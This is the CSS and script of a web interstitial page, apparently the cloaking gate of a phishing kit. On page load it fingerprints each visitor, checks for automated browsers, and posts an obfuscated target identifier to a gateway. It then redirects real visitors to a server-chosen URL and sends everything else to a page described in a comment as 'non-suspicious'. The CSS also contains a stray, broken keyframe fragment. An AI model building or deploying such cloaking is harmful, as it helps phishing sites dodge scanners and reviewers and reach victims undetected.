    <style>
        :root {
            --bg-color: #21292C;
            --primary-text-color: #ffffff;
            --secondary-text-color: #c0c0c0;
            --subtle-text-color: #777;
            --error-color: #E04E5D;
            --error-bg-color: rgba(224, 78, 93, 0.1);
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        html,
        body {
            height: 100%;
        }

        body {
            background-color: var(--bg-color);
            font-family: 'Roboto', sans-serif;
            color: var(--secondary-text-color);
            display: flex;
            flex-direction: column;
            margin: 0;
            overflow-x: hidden;
        }

        .main-content {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .content-box {
            text-align: center;
            width: 100%;
            max-width: 480px;
        }

        .main-logo {
            width: 70px;
            height: 70px;
            margin-bottom: 30px;
            transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out, height 0.3s ease-in-out, margin 0.3s ease-in-out;
        }

        .main-logo.hidden {
            opacity: 0;
            transform: scale(0.8);
            height: 0;
            margin-bottom: 0;
        }

        h1 {
            font-weight: 700;
            font-size: 2.2rem;
            margin-bottom: 16px;
            color: var(--primary-text-color);
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }

        p {
            font-weight: 300;
            font-size: 1.1rem;
            line-height: 1.6;
            overflow-wrap: break-word;
        }

            100% {
                transform: translateX(-100%);

        .error-alert {
            background-color: var(--error-bg-color);
            border: 1px solid var(--error-color);
            border-radius: 8px;
            padding: 30px;
            width: 100%;
            text-align: center;
        }

        .loader {
            width: 200px;
            height: 16px;
            display: inline-block;
            background-color: #FFF;
            border: 1px solid #FFF;
            border-radius: 4px;
            background-image: linear-gradient(45deg, rgba(0, 0, 0, 0.25) 25%, transparent 25%, transparent 50%, rgba(0, 0, 0, 0.25) 50%, rgba(0, 0, 0, 0.25) 75%, transparent 75%, transparent);
            font-size: 30px;
            background-size: 1em 1em;
            box-sizing: border-box;
            animation: barStripe 1s linear infinite;
        }

        @keyframes barStripe {
            0% {
                background-position: 1em 0;
            }

            100% {
                background-position: 0 0;
            }
        }

        .error-icon {
            width: 40px;
            height: 40px;
            color: var(--error-color);
            margin-bottom: 16px;
        }

        .error-alert h1 {
            font-size: 1.5rem;
            text-shadow: none;
        }

        .error-alert p {
            font-size: 1rem;
            margin: 0;
        }

        .state-container {
            transition: opacity 0.3s ease-in-out;
        }

        .hidden {
            display: none !important;
        }

        .footer {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 0.8rem;
            color: var(--subtle-text-color);
            flex-shrink: 0;
        }
    </style>
</head>

    <script type="module" nonce="C96O89mukLsGd/ZHL49G/g==">
        // Config is now minimal and clean.
        const XENIX_CONFIG = {
            fingerprintPublicKey: "9Pvrr6FkrL2vBav6BCSV",
            fingerprintRegion: "eu",
            encodedTargetIdentifier: "t92YuMXZpRXay9WayB3ZulGazlmZANXZpxmZ",
            analyzeSignalsEndpoint: "/api/v1/gateway/analyze-signals"
        };

        // --- DOM Element Selectors ---
        const logoEl = document.querySelector('.main-logo');
        const loadingStateEl = document.getElementById('loading-state');
        const errorStateEl = document.getElementById('error-state');
        const errorTitleEl = document.getElementById('error-title');
        const errorMessageEl = document.getElementById('error-message');

        function showErrorState(title, message) {
            logoEl.classList.add('hidden');
            errorTitleEl.textContent = title;
            errorMessageEl.textContent = message;
            loadingStateEl.classList.add('hidden');
            errorStateEl.classList.remove('hidden');
        }

        /**
         * The main function that runs analysis and handles the new API contract.
         */
        async function runAnalysis() {
            try {
                const FingerprintJS = await import(`https://fpjscdn.net/v3/${XENIX_CONFIG.fingerprintPublicKey}`);
                const fp = await FingerprintJS.load({ region: XENIX_CONFIG.fingerprintRegion });
                const result = await fp.get({ extendedResult: true });

                const payload = {
                    requestId: result.requestId,
                    visitorId: result.visitorId,
                    encodedTargetIdentifier: XENIX_CONFIG.encodedTargetIdentifier,
                    clientWebdriver: navigator.webdriver || false
                };

                const response = await fetch(XENIX_CONFIG.analyzeSignalsEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // --- NEW, SIMPLIFIED RESPONSE HANDLING ---
                const data = await response.json();

                if (response.status === 200 && data.url) {
                    // Success OR Deflection -> Just redirect.
                    window.location.href = data.url;
                } else if ((response.status === 422 || response.status === 503) && data.title && data.message) {
                    // User-Correctable OR Server Error -> Show message and wait.
                    showErrorState(data.title, data.message);
                } else {
                    // Fallback for any other unexpected case.
                    // We'll redirect to a hardcoded, generic, non-suspicious page.
                    window.location.href = 'https://sampe210.vercel.app#';
                }

            } catch (error) {
                // A total client-side failure (e.g., network error, ad blocker).
                console.error('Xenix Interstitial Client-Side Error:', error);
                window.location.href = 'https://sampe210.vercel.app#';
            }
        }

        document.addEventListener('DOMContentLoaded', runAnalysis);
    </script>
